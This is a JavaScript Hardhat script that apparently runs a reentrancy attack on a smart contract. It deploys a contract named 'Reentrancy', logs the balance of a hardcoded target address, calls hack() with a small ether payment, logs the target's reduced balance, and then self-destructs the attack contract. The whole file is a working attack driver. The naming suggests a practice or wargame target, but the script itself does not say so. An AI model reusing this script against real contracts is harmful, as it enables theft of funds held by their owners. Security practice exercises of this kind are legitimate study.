const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  console.log("=== DEPLOYING ===");
  const contractFactory = await hre.ethers.getContractFactory("Reentrancy");
  const contract = await contractFactory.deploy();
  await contract.deployed();
  console.log("=== contract deployed to ", contract.address);
  const hackContractAddress = "0x057DF98db0d86b1244F1A4782Cd5f93c72E98466";
  /*const hackContractName = "Token";
  const signer = await hre.ethers.getSigner();
  const contract = await hre.ethers.getContractAt(
    hackContractName,
    hackContractAddress,
    signer
  );*/
  let num = await hre.ethers.provider.getBalance(hackContractAddress);
  let eht = hre.ethers.utils.formatEther(num);
  console.log("old balance: ", eht);
  console.log("=== HACKING ===");
  await contract.hack({ value: 1000000000000000 });
  num = await hre.ethers.provider.getBalance(hackContractAddress);
  eht = hre.ethers.utils.formatEther(num);
  console.log("new balance: ", eht);
  console.log("=== DESTRUCT ===");
  await contract.kill();
  console.log("=== DONE ===");
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
